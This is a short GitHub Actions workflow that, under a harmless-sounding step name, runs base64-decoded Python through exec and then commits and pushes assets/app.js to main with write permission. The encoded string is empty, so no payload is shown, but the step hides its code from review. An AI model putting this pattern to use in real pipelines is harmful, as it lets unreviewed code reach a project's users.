name: Improve read aloud
on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/add-read-buttons.yml'
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
      - name: Improve speech clarity and pauses
        run: python -c "import base64;exec(base64.b64decode(''))"
      - name: Commit
        run: |
          git config user.name github-actions
          git config user.email github-actions@github.com
          git add assets/app.js
          git diff --cached --quiet && exit 0
          git commit -m "Improve read aloud clarity and pauses"
          git push origin main
